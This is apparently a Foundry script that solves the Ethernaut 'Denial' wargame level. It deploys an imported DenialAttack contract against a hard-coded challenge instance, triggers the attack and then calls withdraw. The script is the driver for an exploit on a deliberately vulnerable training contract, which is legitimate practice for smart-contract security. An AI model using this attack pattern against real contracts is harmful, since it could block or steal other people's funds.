// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/DenialAttack.sol"; // 1) add file

contract SolveDenial is Script { // 2) change contractName

    function run() external {

        address target = 0xF15366e12469Df826d4fC5f36D2C88d233d1Aef1; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);
        console.log("La balance de target est: ", target.balance);

        DenialAttack attacker = new DenialAttack(target);
        attacker.attack();

        vm.stopBroadcast();

        vm.startBroadcast(privateKey);

        IDenial(target).withdraw();

        vm.stopBroadcast();

    }
}